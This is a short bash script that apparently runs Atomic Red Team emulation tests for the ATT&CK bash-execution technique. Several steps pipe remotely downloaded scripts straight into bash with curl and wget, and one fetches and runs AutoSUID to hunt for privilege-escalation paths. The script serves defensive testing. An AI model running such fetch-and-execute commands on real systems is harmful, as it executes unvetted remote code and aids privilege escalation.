#! /bin/bash

# T1059.004 - Command and Scripting Interpreter: Bash

function a() {
# Atomic Test 1 - Create and Execute Bash Shell Script
    echo  $(date -u) "Start of T1059.004 - Create and Execute Bash Shell Script" >> /tmp/attacktest.txt
    sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
    sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
    chmod +x /tmp/art.sh
    sh /tmp/art.sh
    echo  $(date -u) "Completed T1059.004 - Create and Execute Bash Shell Script" >> /tmp/attacktest.txt
    sleep 60
}

function b() {
# Atomic Test #2 - Command-Line Interface
# Using Curl to download and pipe a payload to Bash
    echo "==============================="
    echo $(date -u) "Start of T1059.004 - Command-Line Interface" >> /tmp/attacktest.txt
    curl -sS https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/echo1.sh | bash
    wget --quiet -O - https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/echo2.sh | bash
    echo  $(date -u) "Completed T1059.004 - Command-Line Interface" >> /tmp/attacktest.txt
    sleep 60
}

function c() {
# Atomic Test 3 - Harvest SUID executable files
# AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges.
    echo $(date -u) "Start of T1059.004 - Harvest SUID executable files" >> /tmp/attacktest.txt
    wget -O - https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/autosuid.sh | bash >> /tmp/attackresults.txt
    echo  $(date -u) "Completed T1059.004 - Harvest SUID executable files" >> /tmp/attacktest.txt    
    sleep 60
}

a
b
c
